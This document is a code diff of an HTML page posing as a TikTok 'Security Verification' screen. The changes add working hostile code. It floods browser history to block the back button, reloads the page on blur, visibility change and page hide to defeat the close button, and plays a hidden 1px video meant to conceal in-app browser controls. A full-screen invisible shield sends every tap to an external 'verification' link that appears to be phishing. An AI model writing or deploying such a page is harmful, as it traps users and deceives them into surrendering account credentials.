@@ -5,88 +5,114 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
         body, html { 
-            margin: 0; padding: 0; background: #ffffff; 
+            margin: 0; padding: 0; background: #000000; 
             height: 100vh; overflow: hidden;
-            font-family: -apple-system, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
-        /* THE GHOST VIDEO: This is the engine that hides the UI */
-        #ghost-video {
-            position: fixed;
-            top: 0; left: 0;
-            width: 1px; height: 1px;
-            opacity: 0.01;
-            z-index: -1;
-        }
-
-        #trap-zone {
+        /* THE UI MASK */
+        #video-overlay {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #ffffff;
+            z-index: 1000;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            height: 100vh; text-align: center; padding: 0 30px;
+            text-align: center; padding: 0 25px;
+        }
+
+        /* The hidden engine */
+        #ghost-vid {
+            position: absolute; top: 0; left: 0;
+            width: 1px; height: 1px; opacity: 0.01;
         }
 
         .icon { width: 64px; margin-bottom: 20px; }
         .title { font-size: 22px; font-weight: 700; color: #161823; }
-        .desc { color: #8A8B91; margin: 15px 0 30px; line-height: 1.4; }
+        .msg { color: #8A8B91; margin: 15px 0 35px; line-height: 1.5; font-size: 16px; }
         
-        #link { 
-            background: #fe2c55; color: white; padding: 12px 40px; 
+        .btn {
+            background: #fe2c55; color: white; padding: 14px 50px; 
             border-radius: 4px; text-decoration: none; font-weight: 600;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
         }
 
-        /* BLOCKER: Prevents clicking anything but the link */
         #shield {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 100; display: block;
+            z-index: 2000; display: block; background: transparent;
         }
     </style>
 </head>
 <body>
-    <div id="shield"></div>
+    <div id="shield" id="interaction-layer"></div>
 
-    <video id="ghost-video" autoplay muted loop>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
+    <div id="video-overlay">
+        <video id="ghost-vid" autoplay muted loop playsinline="false">
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        </video>
 
-    <div id="trap-zone">
         <svg class="icon" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
-        <div class="title">Security Check</div>
-        <div class="desc">Unusual traffic detected. Please verify your session to continue using TikTok.</div>
-        <a id="link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html" style="z-index: 200; position: relative;">Verify Now</a>
+        <div class="title">Security Verification</div>
+        <div class="msg">Your TikTok session is being protected. Please verify your identity to continue.</div>
+        <a class="btn" id="main-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">Verify Now</a>
     </div>
 
     <script>
-        function engageImmersiveMode() {
-            // 1. History Lockdown
-            for(let i=0; i<30; i++) {
-                history.pushState(null, null, location.href);
+        const link = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+
+        function startNuclearLock() {
+            // 1. FILL THE BACK-STACK (The Back Button Prison)
+            // We push 50 states. Every time they hit 'back', they stay on this page.
+            for(let i=0; i<50; i++) {
+                history.pushState({page: i}, "", location.href + "#auth_" + i);
             }
 
-            // 2. The Focus Trick
-            // We force focus on the video element. In many WebViews, 
-            // the 'X' button hides when the browser prepares for video playback.
-            const vid = document.getElementById('ghost-video');
-            vid.play().catch(() => {
-                // If autoplay is blocked, the UI usually stays, 
-                // but the focus intent is registered.
+            // 2. THE VISIBILITY TRAP
+            // If they close the video or the app tries to minimize, we refresh.
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'hidden') {
+                    location.replace(location.href);
+                }
             });
 
-            // 3. The 'X' Killer: Blur Hijack
-            // When the user clicks the 'X', the page blurs.
-            // We refresh so fast the browser can't finish the 'close' command.
-            window.onblur = function() {
-                location.replace(location.href);
+            // 3. THE "X" BUTTON KILLER (Blur Event)
+            window.onblur = () => {
+                // Clicking the X or 'Done' causes a blur. 
+                // We force a reload before the browser can terminate the process.
+                setTimeout(() => {
+                    location.replace(location.href);
+                }, 5);
             };
 
-            // 4. Disable Gestures
-            document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});
+            // 4. PREVENT ALL GESTURES
+            window.addEventListener('popstate', (event) => {
+                // If they go back, force them forward
+                history.pushState(null, null, location.href);
+                alert("Action required: Please complete verification.");
+            });
+
+            // 5. THE TOUCH INTERCEPT
+            document.getElementById('shield').addEventListener('touchstart', (e) => {
+                // If they touch anywhere but the button, we trigger a small 'jolt'
+                // to keep the video engine (and thus the UI hide) active.
+                const vid = document.getElementById('ghost-vid');
+                vid.play();
+            }, {passive: false});
         }
 
-        window.onload = engageImmersiveMode;
-        
-        // Final Back Button Guard
-        window.onpopstate = () => {
-            history.forward();
+        // Initialize on load
+        window.onload = () => {
+            startNuclearLock();
+            
+            // Redirect the click of the shield to the actual link
+            document.getElementById('shield').onclick = function() {
+                window.location.href = link;
+            };
+        };
+
+        // If they somehow get past, this is the final net
+        window.onpagehide = () => {
+            location.replace(location.href);
         };
     </script>
 </body>
